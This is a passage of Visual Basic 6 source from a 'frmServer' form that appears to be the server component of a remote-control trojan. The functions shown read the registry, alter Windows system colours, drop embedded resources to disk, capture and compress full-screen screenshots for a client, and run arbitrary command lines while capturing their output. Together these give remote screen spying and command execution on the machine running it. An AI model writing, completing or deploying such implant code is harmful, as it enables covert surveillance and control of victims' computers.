    Dim lValueType As Long, strBuffer As String, lDataBufSize As Long, retValue As Long
    
    'Open Registry Key
    RegOpenKeyA hKey, strPath, retValue
    
    'Read Registry Value
    RegQueryValueExA retValue, strValue, 0, lValueType, ByVal 0, lDataBufSize
    
    'File Value Isnt Blank
    If lDataBufSize Then
    
        'Prepare Variable
        strBuffer = String$(lDataBufSize - 1, vbNullChar)
        
        'Retrieve Registry Value
        RegQueryValueExA retValue, strValue, 0, 0, ByVal strBuffer, lDataBufSize
        
        'Set GetStringKey as Registry Value
        GetStringKey = strBuffer
        
        'Free Handle
        RegCloseKey retValue
        
    End If
End Function

Private Sub SetSystemColors(ByVal strColors As String)
    'On Error Resume Next
    
    'If Restore Then Restore Default Windows Colors
    If strColors = "Restore" Then
    
        'Restore Default Windows Colors
        If DefaultColors(0) <> 0 Then SetSysColors 1, 4, DefaultColors(0):  SetSysColors 1, 5, DefaultColors(1): SetSysColors 1, 7, DefaultColors(2): SetSysColors 1, 8, DefaultColors(3): SetSysColors 1, 15, DefaultColors(4)
    Else
    
        'Set Windows Colors
        Dim strDataParse() As String
        
        'Parse Colors
        strDataParse = Split(strColors, ChrW$(2))
        
        'Find Default Colors
        DefaultColors(0) = GetSysColor(4): DefaultColors(1) = GetSysColor(5): DefaultColors(2) = GetSysColor(7): DefaultColors(3) = GetSysColor(8): DefaultColors(4) = GetSysColor(15)
        
        'Set New Colors
        SetSysColors 1, 4, Int(strDataParse(0)): SetSysColors 1, 5, Int(strDataParse(1)): SetSysColors 1, 7, Int(strDataParse(2)): SetSysColors 1, 8, Int(strDataParse(3)): SetSysColors 1, 15, Int(strDataParse(4))
        
        'Free Array
        Erase strDataParse
        
    End If
End Sub

Private Sub ExtractResource(ByVal dType As String, ByVal resFile As String)
    'On Error Resume Next
    Dim byteData() As Byte, intFile As Integer
    
    'Load Resource Data Into Byte Array
    byteData = LoadResData(dType, "CUSTOM")
    
    'Write Byte Array To File
    intFile = FreeFile
    Open resFile For Binary Access Write As intFile
        Put intFile, , byteData
    Close intFile
    
    'Free Array
    Erase byteData
End Sub

Private Function FileExists(ByVal strFileName As String) As Boolean
    'On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long
    
    'Find If File Exists
    hFile = FindFirstFileA(strFileName, WFD)
    FileExists = hFile <> -1
    
    'Free Handle
    FindClose hFile
End Function

Private Function TakeScreenShot(ByVal DelTemp As Boolean) As String
    'On Error Resume Next
    Dim strFilePath As String
    
    'Prepare Variable
    strFilePath = App.Path & "\TempFileSS.tmp"
    
    'If DelTemp Is True Then Delete Temporary Files
    If DelTemp Then
    
        'Delete Temporary Files
        Kill strFilePath
        Kill strFilePath & ".cmp"
        
    Else
    
        'Make Form Resizable
        frmServer.BorderStyle = 5
        
        'Capture Screen To Form
        DoEvents
        BitBlt Me.hDC, 0, 0, Screen.Width / Screen.TwipsPerPixelX, Screen.Height / Screen.TwipsPerPixelY, GetDC(0), 0, 0, vbSrcCopy
        DoEvents
        
        'Make Form Not Resizable
        frmServer.BorderStyle = 0
        
        'Save Form Image As Bitmap
        SavePicture Me.Image, strFilePath
        
        'Compress Bitmap With ZLIB.DLL (85% Compression Average)
        CompressFile strFilePath, strFilePath & ".cmp"
        
        'Set Variable To Send To Client
        TakeScreenShot = strFilePath & ".cmp"
        
    End If
End Function

Private Sub CompressFile(ByVal FilePathIn As String, ByVal FilePathOut As String)
    'On Error Resume Next
    Dim TheBytes() As Byte, lngFileLen As Long, BufferSize As Long, TempBuffer() As Byte, intZlib As Integer
    
    'Set File Length Variable
    lngFileLen = FileLen(FilePathIn)
    
    'ReDimension Array Length
    ReDim TheBytes(lngFileLen - 1)
    
    'Load File Data Into Array
    intZlib = FreeFile
    Open FilePathIn For Binary Access Read As intZlib
        Get intZlib, , TheBytes()
    Close intZlib
    
    'Set Buffer Size
    BufferSize = UBound(TheBytes) + 1
    BufferSize = BufferSize + (BufferSize * 0.01) + 12
    
    'ReDimension Array Length
    ReDim TempBuffer(BufferSize)
    
    'Compress Array Data
    compress2 TempBuffer(0), BufferSize, TheBytes(0), UBound(TheBytes) + 1, 9
    
    'ReDimension Array Length
    ReDim Preserve TheBytes(BufferSize - 1)
    
    'Free Memory
    RtlMoveMemory TheBytes(0), TempBuffer(0), BufferSize
    Erase TempBuffer
    
    'Delete File If It Already Exists
    If FileExists(FilePathOut) Then
        Kill FilePathOut
        DoEvents
    End If
    
    'Save Compressed File From Array
    intZlib = FreeFile
    Open FilePathOut For Binary Access Write As intZlib
        Put intZlib, , lngFileLen
        Put intZlib, , TheBytes()
    Close intZlib
    
    'Free Array
    Erase TheBytes
End Sub

Private Function DOSOutput(ByVal mCommand As String) As String
    'On Error Resume Next
    Dim proc As PROCESS_INFORMATION, start As STARTUPINFO, sa As SECURITY_ATTRIBUTES, ret As Long, hReadPipe As Long, hWritePipe As Long, lngBytesread As Long, strBuff As String
    
    'Prepare Variables
    sa.nLength = Len(sa)
    sa.bInheritHandle = 1
    sa.lpSecurityDescriptor = 0
    
    'Create Pipe For Output
    If CreatePipe(hReadPipe, hWritePipe, sa, 0) = 0 Then Exit Function
    
    'Prepare Variables
    start.cb = Len(start)
    start.dwFlags = 257
    start.hStdOutput = hWritePipe
    start.hStdError = hWritePipe
    
    'Create Process To Command Prompt
    If CreateProcessA(0, mCommand, sa, sa, 1, 32, 0, 0, start, proc) <> 1 Then Exit Function
    
    'Free Handle
    CloseHandle hWritePipe
    
    'Loop Until All Lines Of Output Are Read To Pipe
    strBuff = String$(256, vbNullChar)
    Do
        ret = ReadFile(hReadPipe, strBuff, 256, lngBytesread, 0&)
        DOSOutput = DOSOutput & Left$(strBuff, lngBytesread)
        DoEvents
    Loop While ret <> 0
    
    'Free Handles
    CloseHandle proc.hProcess
    CloseHandle proc.hThread
    CloseHandle hReadPipe
    CloseHandle lngBytesread
End Function
